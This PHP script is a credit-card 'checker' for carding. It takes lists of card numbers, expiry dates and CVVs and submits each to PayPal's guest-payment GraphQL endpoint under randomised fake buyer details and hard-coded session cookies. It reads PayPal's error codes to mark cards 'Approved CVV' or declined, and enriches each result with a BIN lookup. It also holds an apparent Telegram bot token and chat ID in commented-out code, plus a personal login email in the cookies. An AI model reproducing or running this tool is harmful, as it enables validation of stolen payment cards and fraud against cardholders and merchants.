<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$amount = $_GET['amount'];
$token = multiexplode(array("|", ""), $amount)[0];
$chatid = multiexplode(array("|", ""), $amount)[1];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];


function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


/*function sendMessage($chatID,$messaggio,$token) {
    //echo "sending message to " . $chatID . "\n";

    $url = "https://api.telegram.org/bot'1694852371:AAHIkR6WEkSQPeYBUsx7_ZrRvHagEd40A_4'/sendMessage?chat_id="-1001409053334;
    $url = $url . "&text='🟢 Your card security code is incorrect 🟢'&parse_mode=HTML";
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}*/

$first = str_shuffle("ZELTRAX");
$last = str_shuffle("ROCKZ");
$first1 = str_shuffle("zeltrax85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(0000000000,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";}
else{
$zip = "90201";
$city = "Bell";};



# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.paypal.com',
'method: POST',
'path: /graphql?fetch_credit_form_submit',
'scheme: https',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json',
'cookie: KHcl0EuY7AKSMgfvHl7J5E7hPtK=aSGSqXZbj8PProto7btYkyPJ4V6w2SCoOHraCBMc7WNBvT--fLAoHgqKzJD5u5mlkardZMGo1H4nBrnS; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; cookie_check=yes; d_id=f7716b5518744a0f8d298dcd5654be931622195299625; _gcl_au=1.1.8032171.1622195300; login_email=grionalol%40gmail.com; ui_experience=login_type%3DEMAIL_PASSWORD%26home%3D3%26ph_conf%3D2%253A1623405544416; X-PP-ADS=AToBGr-wYChGYYVoGTvZnZDSm3k-Kxg7Afm9uGAoD6cGMPhTjAPsmCi772MN; rmuc=; enforce_policy=ccpa; akavpau_ppsd=1622834671~id=cd223e601e3f8fec10ce588914dfabca; ts_c=vr%3Da803d4e41790a4912537ab1bfec5cc92%26vt%3Ddd049b001790a12d53a2c0a1ffffffff; LANG=en_US%3BUS; tsrce=graphqlnodeweb; nsid=s%3AyuSbtGSUqxNtWG_oZ9JqkihLnR9Qi6Kn.ugBsf5FdcU5J420sYo4B96TL1IW6e7BXTWeysInk0pQ; ts=vreXpYrS%3D1717605203%26vteXpYrS%3D1622912603%26vr%3Da803d4e41790a4912537ab1bfec5cc92%26vt%3Ddd049b001790a12d53a2c0a1ffffffff%26vtyp%3Dreturn; l7_az=dcg13.slc; x-pp-s=eyJ0IjoiMTYyMjkxMDgwNDIyMCIsImwiOiIxIiwibSI6IjAifQ',
'origin: https://www.paypal.com',
'paypal-client-context: 8FC566718P6416913',
'paypal-client-metadata-id: 8FC566718P6416913',
'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_72e7c41f9b_mty6mzi6mtq&buttonSessionID=uid_8c44e0e11a_mty6mzi6mja&locale.x=en_AU&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFaVWJiN0xvVFhkS3AxTC1iVEw4YXBoLTRQSGtFOGhWMVNBeE5SZU9vT3cwVTBZMkNmTDZXamhsZzhGSzhVTEF2MmVJNHJYOGtBY2RHdDYmY3VycmVuY3k9QVVEJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9BVSIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX3Bmd2VqeGtpYnRzaWJmcWlzbW52dG5odnFlanJmdiJ9fQ&disable-card=&token=8FC566718P6416913',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
'x-app-name: standardcardfields',
'x-country: US'
));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"8FC566718P6416913","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"'.$zip.'","securityCode":"'.$cvv.'"},"phoneNumber":"'.$phone.'","firstName":"'.$firstName.'","lastName":"'.$lastName.'","billingAddress":{"givenName":"'.$firstName.'","familyName":"'.$lastName.'","line1":"'.$address.', ","line2":null,"city":"'.$city.'","state":"'.$state.'","postalCode":"'.$zip.'","country":"US"},"shippingAddress":{"givenName":"'.$firstName.'","familyName":"'.$lastName.'","line1":"'.$address.', ","line2":null,"city":"'.$city.'","state":"'.$state.'","postalCode":"'.$zip.'","country":"US"},"email":"'.$email.'","currencyConversionType":"PAYPAL"},"operationName":null}');


$result1 = curl_exec($ch);

echo $result1;

///////////////////////// Bin Lookup Api //////////////////////////

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
///$test2 = GetStr($fim, '"alpha2":"', '"'); ////country abbreviated example (US)
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}
curl_close($ch);

 #--------paypal responses--------#
 
 
 if

(strpos($result1,  "INVALID_BILLING_ADDRESS" )) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV MATCHED 《 🅆🄾🄻🄵 》 </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

elseif
(strpos($result1,  "INVALID_SECURITY_CODE")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>Approved CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CNN MATCHED《 🅆🄾🄻🄵 》  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
} 

elseif

(strpos($result1,  "CARD_GENERIC_ERROR")) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'> Reprovada CVV ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic Decline《 🅆🄾🄻🄵 》  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
} 


else {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ☠ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Unknown Error《 🅆🄾🄻🄵 》 </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
}

curl_close($ch);

ob_flush();



?>